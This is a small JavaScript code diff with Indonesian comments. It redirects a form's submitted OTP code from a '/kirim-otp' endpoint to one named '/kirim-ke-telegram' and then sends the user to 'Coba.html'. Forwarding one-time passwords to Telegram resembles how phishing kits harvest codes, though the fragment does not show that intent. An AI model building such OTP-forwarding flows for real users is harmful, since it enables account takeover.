@@ -58,7 +58,8 @@
         return;
       }
 
-      fetch("/kirim-otp", {
+      // ✅ ganti endpoint ke '/kirim-ke-telegram'
+      fetch("/kirim-ke-telegram", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ otp })
@@ -68,7 +69,7 @@
           document.querySelector("form").reset();
           btnBatal.setAttribute("disabled", true);
           otpError.style.display = "none";
-          window.location.href = "Coba.html";
+          window.location.href = "Coba.html"; // halaman redirect setelah sukses
         } else {
           alert("❌ Gagal mengirim OTP.");
         }
